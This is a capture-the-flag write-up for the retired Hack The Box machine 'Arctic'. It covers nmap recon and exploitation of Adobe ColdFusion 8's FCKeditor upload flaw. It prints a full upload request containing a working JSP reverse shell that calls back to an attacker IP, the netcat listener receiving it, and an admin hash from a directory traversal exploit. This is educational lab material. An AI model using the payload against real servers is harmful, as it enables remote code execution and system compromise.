# Arctic (Retired)

Retired at the time of attempt. Following the official write up and [ippsec](https://www.youtube.com/watch?v=e9lVyFH7-4o&abab)



## Recon 
### nmap
```bash
sudo nmap -sC -sV -p- -oA nmap/arctic 10.10.10.11
Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-25 22:54 GMT
Nmap scan report for 10.10.10.11
Host is up (0.030s latency).
Not shown: 65532 filtered ports
PORT      STATE SERVICE VERSION
135/tcp   open  msrpc   Microsoft Windows RPC
8500/tcp  open  fmtp?
49154/tcp open  msrpc   Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

#### Port 8500 

NMAP indicates its running FMTP - Flight Message Transfer Protocol, which is a protocol used for flight data, which is very unlikely in a CTF.

Navigating to the port in a browser shows that it contains files and directories associated with Adobe ColdFusion, but its cripplingly slow (30 Seconds per request).  



![image-20210409185600087](/home/boolean/.config/Typora/typora-user-images/image-20210409185600087.png)



#### Ports 135 & 49154

Microsoft RPC



## Exploit (Metasploit) - User



Within the CFIDE we find a subdirectory Administrator, which when clicked sends redirects to an Adobe ColdFusion 



![image-20210409185913583](/home/boolean/.config/Typora/typora-user-images/image-20210409185913583.png)

A searchsploit query for ColdFusion shows a few exploits, most being XSS but one has an File Upload / Execution metasploit module. Running this will give a very quick reverse shell, IF it ran as expected. However there is an error, if the exploit is ran through burp using a proxy we can intercept the exploit. This method was demoed in the Ippsec video.

```http
POST /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/YU.jsp%00 HTTP/1.1
Host: 127.0.0.1:8500
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
Content-Type: multipart/form-data; boundary=_Part_974_542664965_2886893833
Content-Length: 1586
Connection: close

--_Part_974_542664965_2886893833
Content-Disposition: form-data; name="newfile"; filename="AJPDNDNU.txt"
Content-Type: application/x-java-archive

<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream mk;
    OutputStream lm;

    StreamConnector( InputStream mk, OutputStream lm )
    {
      this.mk = mk;
      this.lm = lm;
    }

    public void run()
    {
      BufferedReader so  = null;
      BufferedWriter rke = null;
      try
      {
        so  = new BufferedReader( new InputStreamReader( this.mk ) );
        rke = new BufferedWriter( new OutputStreamWriter( this.lm ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = so.read( buffer, 0, buffer.length ) ) > 0 )
        {
          rke.write( buffer, 0, length );
          rke.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( so != null )
          so.close();
        if( rke != null )
          rke.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath = "cmd.exe";
    Socket socket = new Socket( "10.10.14.12", 9001 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>

--_Part_974_542664965_2886893833--
```

Then navigating to the file in the above payload will trigger the reverse shell within the jsp. In this case YU.jsp

```http
http://127.0.0.1:8500/userfiles/file/YU.jsp
```



This gets us a shell as User

```bash
(boolean㉿kalibox)[~/htb/arctic-pwnd]$ nc -lvnp 9001                                                                                                                                                             1 ⨯
listening on [any] 9001 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.11] 49491
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis

C:\ColdFusion8\runtime\bin>
```



## Exploit (Manual) User

Using exploirt [14641](https://www.exploit-db.com/exploits/14641) we can attempt to get the password for the administrator. However, it is encrypted.

![image-20210409203157028](/home/boolean/.config/Typora/typora-user-images/image-20210409203157028.png)

The problem is that the password is hashed and I do not know the encryption method. Using view source we can copy and paste the password for cracking later. 

```bash
2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
```

Also in the source we can see some information about the encryption methods used to create the above hash

```html
<form name="loginform" action="/CFIDE/administrator/enter.cfm" method="POST" onSubmit="cfadminPassword.value = hex_hmac_sha1(salt.value, hex_sha1(cfadminPassword.value));" >
```

This tells us that the password is hashed using a SHA1, done on the client side. The password is then HMAC'd using a salt value, taken from the salt parameter, also on the client side

```html
<input name="salt" type="hidden" value="1618111486188">
```



